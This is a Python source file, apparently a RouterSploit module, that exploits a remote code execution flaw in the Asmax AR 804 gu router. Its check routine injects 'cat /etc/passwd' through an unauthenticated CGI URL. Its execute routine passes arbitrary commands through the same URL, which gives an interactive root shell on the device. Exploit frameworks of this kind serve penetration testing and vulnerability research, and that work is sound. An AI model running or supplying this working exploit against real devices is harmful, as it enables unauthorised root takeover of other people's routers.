from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    mute,
    validators,
    shell
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Asmax AR 804 Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands with root privileges.
    """
    __info__ = {
        'name': 'Asmax AR 804 RCE',
        'authors': [
            'Michal Sajdak <michal.sajdak[at]securitum.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'description': 'Module exploits Asmax AR 804 Remote Code Execution vulnerability which '
                       'allows executing command on operating system level with root privileges.',
        'references': [
            'http://www.securitum.pl/dh/asmax-ar-804-gu-compromise',
            'https://www.exploit-db.com/exploits/8846/',
        ],
        'devices': [
            'Asmax AR 804 gu',
        ],
    }

    target = exploits.Option('', 'Target URL address e.g. http://192.168.1.1', validators=validators.url)  # target url address
    port = exploits.Option(80, 'Target HTTP port', validators=validators.integer)  # target http port

    def run(self):
        print_status("Checking if target is vulnerable")

        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        """ callback used by shell functionality """
        url = "{}:{}/cgi-bin/script?system%20{}".format(self.target, self.port, cmd)

        response = http_request(method="GET", url=url)
        if response is None:
            return ""

        return response.text

    @mute
    def check(self):
        cmd = "cat /etc/passwd"
        url = "{}:{}/cgi-bin/script?system%20{}".format(self.target, self.port, cmd)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "root:" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
